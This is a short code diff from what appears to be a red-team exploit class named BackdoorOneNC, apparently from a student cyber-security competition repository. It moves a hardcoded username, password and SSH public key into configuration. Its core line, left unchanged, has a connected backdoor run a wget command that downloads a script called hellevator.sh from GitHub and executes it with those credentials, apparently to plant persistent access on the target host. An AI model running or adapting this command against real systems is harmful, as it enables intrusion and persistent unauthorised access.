@@ -18,9 +18,9 @@ class BackdoorOneNC(Exploit):
 				socket_connection.settimeout(None)
 				# logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")
 
-				username = "josh"
-				password = "password"
-				ssh_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHEVlp/30J0wOuK53YrqMTQ7SduqUw3Mj6R1vfFx76zm josh@parrot"
+				username = self.parsed_config["ssh_username"]
+				password = self.parsed_config["ssh_password"]
+				ssh_key = self.parsed_config["ssh_public_key"]
 
 				download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"
 				# logger.debug(f"{self.ip_address} - Running command `{download_hellevator_command}`...")
